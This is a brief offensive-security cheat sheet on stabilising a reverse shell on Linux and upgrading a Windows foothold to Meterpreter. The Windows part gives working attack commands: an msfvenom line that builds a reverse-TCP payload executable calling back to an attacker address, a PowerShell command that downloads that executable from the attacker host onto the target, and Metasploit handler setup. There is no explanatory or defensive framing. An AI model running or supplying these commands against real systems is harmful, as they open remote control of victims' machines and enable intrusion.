# Shell stabilization

## Linux

### Using Python
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

`CTRL + Z`

```bash
stty raw -echo; fg
```

## Windows

## Upgrade to meterpreter
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ip] LPORT=[port] --platform windows -f exe > shell.exe

powershell -c "Invoke-WebRequest -Uri 'http://[ip]:[port]/shell.exe' -OutFile 'shell.exe'"

msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
```
